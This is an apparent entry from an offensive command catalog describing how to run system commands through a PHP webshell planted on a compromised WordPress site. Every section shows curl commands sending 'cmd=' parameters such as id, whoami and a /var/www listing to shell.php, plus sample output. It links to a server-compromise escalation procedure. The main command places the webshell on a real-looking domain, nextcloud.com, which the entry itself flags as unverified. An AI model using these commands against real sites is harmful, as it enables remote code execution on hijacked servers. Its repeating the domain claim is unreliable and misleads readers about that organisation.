---
id: cmd-curl-shell
data: 'curl "https://nextcloud.com/wp-content/themes/malicious/shell.php?cmd=id"'
tags:
  - rce
  - webshell
type: command
output: uid=33(www-data) gid=33(www-data)
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:36.640Z'
verified: false
validated: true
submitted: true
---
# curl-shell-access

## Command

```bash
curl "https://nextcloud.com/wp-content/themes/malicious/shell.php?cmd=id"
```

## Description

Executes a system command via a uploaded PHP webshell on a compromised WordPress site.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `?cmd=` | Command to execute | Yes |

## Examples

### Basic Usage

```bash
curl "https://example.com/shell.php?cmd=whoami"
```

### Advanced Usage

```bash
curl -d "cmd=ls -la /var/www" https://example.com/shell.php
```

## Expected Output

Command output, e.g., current user ID.

## Related

- [[Related Procedure: Escalate-WordPress-Access-to-Server-Compromise]]
